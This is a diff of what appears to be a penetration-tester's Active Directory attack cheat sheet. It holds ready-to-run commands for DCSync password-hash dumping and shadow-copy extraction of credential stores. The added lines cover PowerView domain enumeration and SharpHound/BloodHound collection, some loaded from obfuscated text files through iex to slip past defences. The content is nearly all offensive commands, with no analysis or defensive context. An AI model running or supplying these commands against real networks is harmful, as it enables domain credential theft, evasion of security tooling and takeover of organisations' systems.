@@ -24,12 +24,24 @@ Invoke-dcsync
 
 Invoke-DCSync -PWDumpFormat
 
------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
 Copy-Vss
 
 Import-Module .\Copy-VSS.ps1
 Copy-VSS
 Copy-VSS -DestinationDir C:\ShadowCopy\
------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
+POWERVIEW
+([string] (gc .\pv3.txt)) | iex; (de) | iex
+Get-DomainComputer | Export-CSV -NoTypeInformation out.csv
+Get-DomainUser | Export-CSV -NoTypeInformation out.csv
+Get-DomainGroupMember -Identity “Domain Admins”
 
+--------------------------------------------------------------------------------------------------------------------------------
+BLOODHOUND
+Encrypted Bloodhound
+([string] (gc .\sharphound.txt)) | iex; (de)|iex;Invoke-BloodHound
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound
+--------------------------------------------------------------------------------------------------------------------------------
 
